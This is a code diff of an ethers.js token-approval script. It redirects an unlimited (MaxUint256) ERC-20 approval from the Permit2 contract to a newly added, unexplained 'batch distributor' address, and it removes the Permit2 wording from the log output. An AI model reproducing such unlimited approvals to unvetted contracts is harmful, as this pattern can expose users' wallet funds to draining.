@@ -8,6 +8,7 @@ const provider = new ethers.JsonRpcProvider(rpc);
 
 const TOKEN_ADDRESS = "0x1111111111166b7fe7bd91427724b487980afc69";
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const BATCH_DISTRIBUTOR_ADDRESS = "0x4F57fE90Ba8A20302b6C64D40225876f2ae8fe70";
 const GAS_LIMIT = 60000;
 
 const getGasPrice = async () => {
@@ -25,15 +26,15 @@ const main = async () => {
   const gasPrice = await getGasPrice();
   console.log("Gas Price: ", gasPrice);
 
-  const allowance = await tokenContract.allowance(wallet.address, PERMIT2_ADDRESS);
+  const allowance = await tokenContract.allowance(wallet.address, BATCH_DISTRIBUTOR_ADDRESS);
   console.log("Current allowance:", allowance);
 
   if (allowance > 0) {
-    console.log("Token already approved for Permit2.");
+    console.log("Token already approved");
     return;
   }
 
-  const tx = await tokenContract.approve(PERMIT2_ADDRESS, ethers.MaxUint256, {
+  const tx = await tokenContract.approve(BATCH_DISTRIBUTOR_ADDRESS, ethers.MaxUint256, {
     gasLimit: GAS_LIMIT,
     maxFeePerGas: gasPrice,
     maxPriorityFeePerGas: gasPrice,
